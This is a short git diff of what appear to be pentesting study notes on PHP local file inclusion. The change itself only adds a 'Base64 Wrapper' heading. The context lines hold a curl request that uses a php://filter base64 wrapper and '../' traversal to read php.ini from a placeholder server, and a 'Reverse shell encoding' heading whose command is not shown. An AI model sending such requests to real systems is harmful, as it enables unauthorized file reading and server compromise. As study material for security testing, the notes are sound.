@@ -9,6 +9,9 @@ Determine if allow_url_include is enabled (X.Y for php version)
 /etc/php/X.Y/fpm/php.ini (Nginx)
 ```
 
+
+### Base64 Wrapper
+
 Reading config file with curl
 ```shell-session
 curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini" (Apache)
@@ -17,7 +20,6 @@ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.bas
 ```
 
 ### Data Wrapper
-
 
 Reverse shell encoding
 ```shell-session
